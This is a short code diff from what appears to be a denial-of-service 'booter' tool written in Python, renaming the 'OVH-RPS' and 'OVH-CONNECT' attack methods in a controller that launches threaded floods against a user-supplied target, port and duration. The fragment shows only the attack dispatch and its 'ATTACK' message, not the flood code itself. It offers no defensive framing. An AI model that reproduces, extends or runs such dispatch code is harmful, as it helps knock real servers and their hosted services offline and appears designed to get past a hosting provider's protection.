@@ -65,7 +65,7 @@ def controler():
             times = com[3]
             thread = com[4]
             booters = com[5]
-            threading.Thread(target=type_sender,args=('OVH-RPS',f'{target} {port} {times} {thread} {booters}')).start()
+            threading.Thread(target=type_sender,args=('OVH_RPS',f'{target} {port} {times} {thread} {booters}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['OVHRPS']))
         elif a =='OVH-CONNECT' or a == 'OVH-الاتصال' or a == 'OVHCONNECT':
@@ -75,7 +75,7 @@ def controler():
             times = com[3]
             thread = com[4]
             booters = com[5]
-            threading.Thread(target=type_sender,args=('OVH-CONNECT',f'{target} {port} {times} {thread} {booters}')).start()
+            threading.Thread(target=type_sender,args=('OVH_CONNECT',f'{target} {port} {times} {thread} {booters}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['OVHCONNECT']))
         elif a == 'MENU':
